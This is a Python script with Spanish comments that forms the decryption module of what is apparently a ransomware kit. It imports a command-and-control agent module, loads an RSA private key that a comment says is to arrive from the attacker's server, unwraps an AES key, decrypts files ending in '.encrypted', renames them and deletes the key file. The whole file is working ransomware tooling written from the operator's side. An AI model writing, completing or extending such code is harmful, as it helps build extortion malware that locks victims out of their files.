import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import unpad
from find_files import find_files
import agent_c2
def load_private_rsa_key(): #tiene que llegar a través de una petición al servidor del atacante. 
    ruta_clave_privada = os.path.abspath("rsa_private.pem")
    if os.path.exists(ruta_clave_privada):
        with open(ruta_clave_privada, "rb") as clave_file:
            return RSA.import_key(clave_file.read())
    else:
        raise FileNotFoundError(f"El archivo de clave privada no se encuentra en: {ruta_clave_privada}")

def load_aes_key_encrypted():
    ruta_clave_aes = os.path.abspath("aes_key_encrypted.bin")
    if os.path.exists(ruta_clave_aes):
        with open(ruta_clave_aes, "rb") as clave_file:
            return clave_file.read()
    else:
        raise FileNotFoundError(f"El archivo de clave AES cifrada no se encuentra en: {ruta_clave_aes}")

def decrypt_aes_key_encrypted (clave_privada, clave_aes_cifrada):
    
    cipher_rsa = PKCS1_OAEP.new(clave_privada)
    return cipher_rsa.decrypt(clave_aes_cifrada)

def descifrar_archivo(archivo, clave):
    with open(archivo, "rb") as f:
        iv_y_datos_cifrados = f.read()
    iv = iv_y_datos_cifrados[:16]  # El IV ocupa los primeros 16 bytes
    datos_cifrados = iv_y_datos_cifrados[16:]
    cipher = AES.new(clave, AES.MODE_CBC, iv)
    datos_descifrados = unpad(cipher.decrypt(datos_cifrados), AES.block_size)
    with open(archivo, "wb") as f:
        f.write(datos_descifrados)  # Sobrescribimos el archivo con los datos descifrados

def descifrar_archivos():
    archivos = find_files()  # Ahora devuelve solo la lista de archivos (rutas completas)
    if not archivos or not isinstance(archivos, list):  # Verifica si `archivos` es válido
        print("Error: No se pudo obtener la lista de archivos o está vacía.")
        return
    rsa_private_key = load_private_rsa_key()
    aes_key_encrypted = load_aes_key_encrypted()
    aes_key = decrypt_aes_key_encrypted(rsa_private_key, aes_key_encrypted)
    print("Clave AES descifrada correctamente.")
    for archivo in archivos:
        if archivo.endswith(".encrypted") and os.path.isfile(archivo):  # Verifica extensión y que es un archivo válido
            print(f"Descifrando: {archivo}")  # Depuración
            descifrar_archivo(archivo, aes_key)
            nueva_ruta = archivo[:-10]  # Elimina la extensión '.encrypted'
            # Manejo de errores al renombrar
            try:
                os.rename(archivo, nueva_ruta)
                print(f"Archivo descifrado y renombrado: {archivo} -> {nueva_ruta}")
            except OSError as e:
                print(f"Error al renombrar el archivo {archivo}: {e}")
    # Eliminar la clave AES cifrada después del proceso
    try:
        os.remove("aes_key_encrypted.bin")
        print("Clave AES cifrada eliminada.")
    except FileNotFoundError:
        print("Advertencia: No se encontró aes_key_encrypted.bin para eliminar.")
    print("Archivos descifrados correctamente.")

if __name__ == "__main__":
    descifrar_archivos()
